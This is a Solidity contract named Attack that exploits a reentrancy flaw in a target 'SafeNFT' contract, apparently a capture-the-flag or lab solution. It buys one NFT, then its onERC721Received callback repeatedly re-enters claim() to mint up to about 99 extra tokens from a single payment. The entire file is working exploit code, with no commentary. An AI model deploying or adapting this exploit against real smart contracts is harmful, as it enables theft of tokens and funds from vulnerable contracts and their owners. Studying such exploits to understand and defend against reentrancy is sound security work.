// SPDX-License-Identifier: WTFPL
pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface ISafeNFT {
    function buyNFT() external payable;

    function claim() external;
}

contract Attack is IERC721Receiver {
    ISafeNFT private safeNFT;
    uint8 private supplyIs;
    bool private reentrancyAttackTriggered = false;

    constructor(address safeNFTAddress) payable {
        safeNFT = ISafeNFT(safeNFTAddress);
        safeNFT.buyNFT{value: msg.value}();
    }

    function attack() public {
        safeNFT.claim();
    }

    function onERC721Received(
        address /*operator*/,
        address /*from*/,
        uint256 /*tokenId*/,
        bytes memory /*data*/
    ) public override returns (bytes4) {
        if (supplyIs < 99) {
            supplyIs++;
            safeNFT.claim();
        }

        return this.onERC721Received.selector;
    }
}
